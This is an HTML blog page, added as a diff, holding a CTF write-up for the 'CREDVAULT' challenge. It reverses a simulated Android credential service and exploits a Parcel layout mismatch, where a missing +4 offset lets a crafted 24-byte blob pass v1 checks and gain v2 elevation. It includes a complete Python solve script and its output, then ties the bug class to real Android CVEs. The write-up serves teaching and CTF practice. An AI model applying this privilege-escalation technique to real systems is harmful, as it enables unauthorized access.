@@ -1,0 +1,398 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <title>CREDVAULT (OmniCTF 2026 Quals) — Android Parcel Format Mismatch</title>
+    <meta name="description" content="Writeup for CREDVAULT (OmniCTF 2026 Quals) — reverse two Parcel parsers in a Linux binary, find the missing +4 offset in the elevation path, and craft a 24-byte blob that passes v1 validation while satisfying v2's auth_level check">
+    <meta property="og:title" content="CREDVAULT (OmniCTF 2026 Quals) — Android Parcel Format Mismatch" />
+    <meta property="og:locale" content="en_US" />
+    <meta property="og:type" content="article" />
+    <meta name="twitter:card" content="summary" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+    <link href="https://fonts.googleapis.com/css2?family=Work+Sans:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="icon" type="image/jpeg" href="../avatar.jpg">
+
+    <style>
+      :root {
+        --bg: #121212;
+        --fg: #e0e0e0;
+        --accent: #61dafb;
+        --border: #333;
+        --muted: #a0a0a0;
+      }
+
+      * { box-sizing: border-box; }
+
+      body {
+        margin: 0;
+        padding: 0;
+        background: var(--bg);
+        color: var(--fg);
+        font-family: 'Work Sans', sans-serif;
+        line-height: 1.6;
+      }
+
+      a { color: var(--accent); text-decoration: none; }
+      a:hover { text-decoration: underline; }
+
+      .wrapper {
+        max-width: 768px;
+        margin: 0 auto;
+        padding: 2rem 1rem 3rem;
+      }
+
+      .site-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 3rem;
+      }
+      .site-title { font-weight: 700; font-size: 1.5rem; color: var(--fg); }
+      .site-logo { height: 48px; width: 48px; border-radius: 50%; object-fit: cover; }
+
+      .post { max-width: 768px; margin: 0 auto; }
+
+      .post-header h1 { margin: 0 0 0.5rem; font-size: 2rem; font-weight: 500; }
+      .post-subtitle { margin: 0 0 0.75rem; opacity: 0.8; font-size: 1rem; }
+      .post-meta {
+        margin: 0 0 1.5rem;
+        font-size: 0.9rem;
+        color: var(--muted);
+        display: flex;
+        flex-wrap: wrap;
+        gap: 0.75rem;
+      }
+      .post-tags { display: flex; flex-wrap: wrap; gap: 0.4rem; margin-top: 0.4rem; }
+      .tag {
+        font-size: 0.75rem;
+        padding: 0.15rem 0.5rem;
+        border-radius: 999px;
+        border: 1px solid var(--border);
+        background: rgba(255,255,255,0.02);
+      }
+
+      .post-toc {
+        margin: 2rem 0;
+        padding: 1rem 1.25rem;
+        border-radius: 0.75rem;
+        border: 1px solid var(--border);
+        background: #181818;
+      }
+      .post-toc-title {
+        margin: 0 0 0.5rem;
+        font-size: 0.95rem;
+        font-weight: 500;
+        text-transform: uppercase;
+        letter-spacing: 0.06em;
+        opacity: 0.8;
+      }
+      .post-toc ul { margin: 0; padding-left: 1.25rem; font-size: 0.95rem; }
+      .post-toc li { margin: 0.1rem 0; }
+
+      section + section { margin-top: 2rem; }
+      h2 { font-size: 1.4rem; margin-bottom: 0.5rem; font-weight: 500; }
+      h3 { font-size: 1.15rem; margin-bottom: 0.4rem; font-weight: 500; }
+      p { margin: 0 0 0.9rem; }
+      ul, ol { padding-left: 1.25rem; margin-top: 0; margin-bottom: 0.9rem; }
+
+      code {
+        font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+        font-size: 0.9rem;
+        background: rgba(255,255,255,0.04);
+        padding: 0.15rem 0.3rem;
+        border-radius: 0.25rem;
+      }
+
+      pre {
+        margin: 0 0 1.25rem;
+        padding: 0.85rem 1rem;
+        background: #0b0b0b;
+        border-radius: 0.5rem;
+        border: 1px solid #1f1f1f;
+        overflow-x: auto;
+      }
+      pre code { background: transparent; padding: 0; }
+
+      .note {
+        padding: 0.75rem 1rem;
+        border-radius: 0.5rem;
+        border: 1px solid var(--border);
+        background: #181818;
+        font-size: 0.92rem;
+        margin-bottom: 1rem;
+      }
+
+      .back-link { margin: 0 0 2rem; font-size: 0.95rem; }
+
+      .site-footer {
+        border-top: 1px solid var(--border);
+        margin-top: 3rem;
+        padding-top: 1rem;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+      }
+      .site-footer p { margin: 0; font-size: 0.9rem; opacity: 0.6; }
+    </style>
+  </head>
+  <body>
+    <div class="wrapper">
+
+      <header class="site-header">
+        <a href="/" class="site-title">Alexandru Hossu</a>
+        <img src="../avatar.jpg" alt="Logo" class="site-logo">
+      </header>
+
+      <article class="post">
+        <p class="back-link">← <a href="/blog/">Back to blog</a></p>
+
+        <header class="post-header">
+          <h1>CREDVAULT (OmniCTF 2026 Quals) — Android Parcel Format Mismatch</h1>
+          <p class="post-subtitle">
+            A stripped Linux ELF simulating <code>com.android.credentialservice.CredVaultService</code>.
+            Two Parcel parsers operate on the same 24-byte blob with different field layouts — v1 has
+            a <code>format_tag</code> prefix that v2 removed. The elevation handler passes
+            <code>cred_buf</code> to the v2 parser instead of <code>cred_buf + 4</code>, shifting every
+            v2 field by one slot. Setting <code>user_uid = AUTH_ELEVATED</code> satisfies v1 (field is
+            unchecked) and satisfies v2's <code>auth_level</code> check at the same time.
+          </p>
+          <p class="post-meta">
+            <span>rev • pwn • Android</span>
+            <span>OmniCTF 2026 Quals</span>
+            <span>Challenge by Alexandru Hossu</span>
+          </p>
+          <div class="post-tags">
+            <span class="tag">Android</span>
+            <span class="tag">Parcel Mismatch</span>
+            <span class="tag">IDA / Ghidra</span>
+            <span class="tag">Python</span>
+            <span class="tag">CVE-2021-0928 class</span>
+          </div>
+        </header>
+
+        <nav class="post-toc">
+          <p class="post-toc-title">On this page</p>
+          <ul>
+            <li><a href="#setup">Challenge setup</a></li>
+            <li><a href="#reversing">Step 1 — reversing credvault</a></li>
+            <li><a href="#bug">Step 2 — the mismatch bug</a></li>
+            <li><a href="#parcel">Step 3 — crafting the exploit Parcel</a></li>
+            <li><a href="#exploit">Step 4 — solve.py</a></li>
+            <li><a href="#context">Why this bug class matters</a></li>
+          </ul>
+        </nav>
+
+        <section id="setup">
+          <h2>Challenge setup</h2>
+          <p>You get <code>credvault</code> — a stripped x86-64 Linux ELF simulating an Android system service that issues elevated credential tokens. The server runs your <code>solve.py</code> against a live instance listening on loopback and streams stdout back. Flag comes out of <code>OP_READ_KEY</code> only after a successful elevation sequence.</p>
+          <p>Binary TCP, little-endian:</p>
+          <ul>
+            <li>Request: <code>uint32_t op_code | uint32_t in_len | data[in_len]</code></li>
+            <li>Response: <code>uint32_t status | uint32_t out_len | data[out_len]</code></li>
+          </ul>
+          <pre><code>| Code         | Name             | Input               |
+|--------------|------------------|---------------------|
+| 0xCA000001   | OP_CONNECT       | -                   |
+| 0xCA000002   | OP_WRITE_CRED    | 24-byte Parcel blob |
+| 0xCA000003   | OP_VALIDATE_CRED | -                   |
+| 0xCA000004   | OP_ELEVATE_CRED  | -    &lt;-- vulnerable |
+| 0xCA000005   | OP_READ_KEY      | -                   |</code></pre>
+        </section>
+
+        <section id="reversing">
+          <h2>Step 1 — reversing credvault</h2>
+          <p>Load in IDA or Ghidra. Find the main dispatch loop over the five op codes. Two <code>__attribute__((noinline))</code> functions are called from the <code>OP_ELEVATE_CRED</code> handler — these are the two Parcel parsers.</p>
+
+          <h3>validate_credential_v1</h3>
+          <p>Reads a 24-byte <code>cred_v1_t</code> struct:</p>
+          <pre><code>typedef struct {
+    uint32_t format_tag;   /* [+0]   must == 0xCA110001 (FORMAT_LEGACY) */
+    uint32_t user_uid;     /* [+4]   unchecked                          */
+    uint32_t auth_level;   /* [+8]   must == 0x00000001 (AUTH_STANDARD) */
+    uint32_t grant_bits;   /* [+12]  must == 0                          */
+    uint32_t padding;      /* [+16]  must == 0                          */
+    uint32_t checksum;     /* [+20]  must == XOR(all five fields above) */
+} cred_v1_t;</code></pre>
+          <p><code>user_uid</code> at offset +4 is explicitly not checked. All other fields are validated before reaching the checksum.</p>
+
+          <h3>elevate_credential_v2</h3>
+          <p>Reads a 16-byte <code>cred_v2_t</code> struct — <code>format_tag</code> was removed in v2:</p>
+          <pre><code>typedef struct {
+    uint32_t user_uid;     /* [+0]  unchecked              */
+    uint32_t auth_level;   /* [+4]  must == 0xCA110042     */
+    uint32_t grant_bits;   /* [+8]  reserved               */
+    uint32_t padding;      /* [+12] reserved               */
+} cred_v2_t;</code></pre>
+          <p>The only check is <code>p-&gt;auth_level != AUTH_ELEVATED</code>. Find <code>AUTH_ELEVATED = 0xCA110042</code> as a <code>CMP</code> immediate in the disassembly.</p>
+        </section>
+
+        <section id="bug">
+          <h2>Step 2 — the mismatch bug</h2>
+          <p>In the <code>OP_ELEVATE_CRED</code> handler:</p>
+          <pre><code>if (elevate_credential_v2(conn-&gt;cred_buf, conn-&gt;cred_len)) {   /* should be cred_buf + 4 */
+    conn-&gt;elevated = 1;
+    ...</code></pre>
+          <p>The missing <code>+4</code> means v2 receives the raw buffer starting at offset 0, not at offset 4 where the v2 layout actually begins. Every v2 field is shifted one slot left relative to what v2 expects:</p>
+          <pre><code>Offset   v1 name        v2 name (what v2 actually reads)
+[+0]     format_tag     user_uid
+[+4]     user_uid   --&gt; auth_level   &lt;-- v2 checks this for 0xCA110042
+[+8]     auth_level     grant_bits
+[+12]    grant_bits     padding
+[+16]    padding        (end of v2)
+[+20]    checksum</code></pre>
+          <div class="note">
+            Setting <code>auth_level = AUTH_ELEVATED</code> at the v1 layout position (+8) does not work — v1 checks <code>auth_level == AUTH_STANDARD (0x00000001)</code> and rejects it. The only unchecked field in v1 is <code>user_uid</code> at +4, which happens to be exactly where v2 reads <code>auth_level</code>.
+          </div>
+        </section>
+
+        <section id="parcel">
+          <h2>Step 3 — crafting the exploit Parcel</h2>
+          <p>Set <code>user_uid = AUTH_ELEVATED = 0xCA110042</code>. v1 ignores it, v2 reads it as <code>auth_level</code> and grants elevation. The checksum ties it together — compute it as XOR over all five v1 fields:</p>
+          <pre><code>FORMAT_LEGACY = 0xCA110001
+AUTH_STANDARD = 0x00000001
+AUTH_ELEVATED = 0xCA110042
+
+fmt  = FORMAT_LEGACY
+uid  = AUTH_ELEVATED   # v2 reads this as auth_level
+auth = AUTH_STANDARD   # v1 checks this at +8
+gb   = 0
+pad  = 0
+csum = fmt ^ uid ^ auth ^ gb ^ pad   # = 0x00000042
+
+parcel = struct.pack('&lt;IIIIII', fmt, uid, auth, gb, pad, csum)</code></pre>
+          <p>v1 sees: <code>format_tag=FORMAT_LEGACY</code>, <code>auth_level=AUTH_STANDARD</code>, <code>grant_bits=0</code>, <code>padding=0</code>, <code>checksum=0x42</code> — all pass.<br>
+          v2 sees at offset +4: <code>0xCA110042 = AUTH_ELEVATED</code> — elevation granted.</p>
+        </section>
+
+        <section id="exploit">
+          <h2>Step 4 — solve.py</h2>
+          <p>Required sequence: <code>OP_CONNECT</code> -&gt; <code>OP_WRITE_CRED</code> -&gt; <code>OP_VALIDATE_CRED</code> -&gt; <code>OP_ELEVATE_CRED</code> -&gt; <code>OP_READ_KEY</code>.</p>
+          <pre><code>#!/usr/bin/env python3
+"""
+solve.py -- CredVault CTF challenge solution
+
+Usage:
+    python3 solve.py &lt;host&gt; &lt;port&gt;
+"""
+import socket, struct, sys
+
+FORMAT_LEGACY = 0xCA110001
+AUTH_STANDARD = 0x00000001
+AUTH_ELEVATED = 0xCA110042
+
+OP_CONNECT       = 0xCA000001
+OP_WRITE_CRED    = 0xCA000002
+OP_VALIDATE_CRED = 0xCA000003
+OP_ELEVATE_CRED  = 0xCA000004
+OP_READ_KEY      = 0xCA000005
+
+STATUS_OK = 0x00000000
+
+
+def send_req(s, op, data=b''):
+    s.sendall(struct.pack('&lt;II', op, len(data)) + data)
+
+
+def recv_resp(s):
+    buf = b''
+    while len(buf) &lt; 8:
+        chunk = s.recv(8 - len(buf))
+        if not chunk:
+            raise ConnectionError('server closed')
+        buf += chunk
+    st, ln = struct.unpack('&lt;II', buf)
+    data = b''
+    while len(data) &lt; ln:
+        chunk = s.recv(ln - len(data))
+        if not chunk:
+            raise ConnectionError('server closed')
+        data += chunk
+    return st, data
+
+
+def build_parcel():
+    fmt  = FORMAT_LEGACY
+    uid  = AUTH_ELEVATED   # v2 reads this as auth_level
+    auth = AUTH_STANDARD   # v1 checks this at +8
+    gb   = 0
+    pad  = 0
+    csum = fmt ^ uid ^ auth ^ gb ^ pad
+    return struct.pack('&lt;IIIIII', fmt, uid, auth, gb, pad, csum)
+
+
+def solve(host, port):
+    s = socket.create_connection((host, port), timeout=30)
+
+    send_req(s, OP_CONNECT)
+    st, d = recv_resp(s)
+    assert st == STATUS_OK, f'CONNECT: {st:#X}'
+    sid = struct.unpack('&lt;I', d)[0]
+    print(f'[*] connected  session=0x{sid:08X}')
+
+    parcel = build_parcel()
+    send_req(s, OP_WRITE_CRED, parcel)
+    st, _ = recv_resp(s)
+    assert st == STATUS_OK, f'WRITE_CRED: {st:#X}'
+    print(f'[*] credential written  ({len(parcel)} bytes)')
+    print(f'    format_tag=0x{FORMAT_LEGACY:08X}  user_uid=0x{AUTH_ELEVATED:08X}')
+    print(f'    auth_level=0x{AUTH_STANDARD:08X}  checksum=0x{FORMAT_LEGACY^AUTH_ELEVATED^AUTH_STANDARD:08X}')
+
+    send_req(s, OP_VALIDATE_CRED)
+    st, _ = recv_resp(s)
+    assert st == STATUS_OK, f'VALIDATE_CRED: {st:#X}'
+    print('[*] v1 validation: PASS')
+
+    send_req(s, OP_ELEVATE_CRED)
+    st, _ = recv_resp(s)
+    assert st == STATUS_OK, f'ELEVATE_CRED: {st:#X}'
+    print('[+] v2 elevation: GRANTED  (parcel mismatch triggered)')
+
+    send_req(s, OP_READ_KEY)
+    st, data = recv_resp(s)
+    assert st == STATUS_OK, f'READ_KEY: {st:#X}'
+    print(f'[+] {data.decode()}')
+
+    s.close()
+
+
+def main():
+    if len(sys.argv) != 3:
+        sys.exit(f'usage: python3 {sys.argv[0]} &lt;host&gt; &lt;port&gt;')
+    solve(sys.argv[1], int(sys.argv[2]))
+
+
+if __name__ == '__main__':
+    main()</code></pre>
+          <p>Expected output:</p>
+          <pre><code>[*] connected  session=0xCA1DCAFE
+[*] credential written  (24 bytes)
+    format_tag=0xCA110001  user_uid=0xCA110042
+    auth_level=0x00000001  checksum=0x00000042
+[*] v1 validation: PASS
+[+] v2 elevation: GRANTED  (parcel mismatch triggered)
+[+] CTF{&lt;64 hex chars&gt;}</code></pre>
+        </section>
+
+        <section id="context">
+          <h2>Why this bug class matters</h2>
+          <p>Android Parcel format mismatches have been an active production CVE class for over a decade. The mechanism here is structurally identical to each of these:</p>
+          <ul>
+            <li><strong>CVE-2021-0928</strong>: <code>writeToParcel</code>/<code>createFromParcel</code> field ordering mismatch in <code>OutputConfiguration</code> — privilege escalation from app to system.</li>
+            <li><strong>CVE-2023-20963</strong>: <code>WorkSource</code> parcel/unparcel logic mismatch — exploited in the wild to bypass the Android application sandbox.</li>
+            <li><strong>CVE-2024-49746</strong>: <code>Parcel::continueWrite</code> reads from a different field layout than the writer — FD confusion and privilege escalation.</li>
+          </ul>
+          <p>The root cause is always the same: a shared forwarding path passes the raw buffer to both parser versions without adjusting the pointer to match the newer layout. The fix here is one line: <code>cred_buf + 4</code> instead of <code>cred_buf</code>.</p>
+        </section>
+
+      </article>
+
+      <footer class="site-footer">
+        <p>2026 &copy; Alexandru Hossu</p>
+      </footer>
+
+    </div>
+  </body>
+</html>
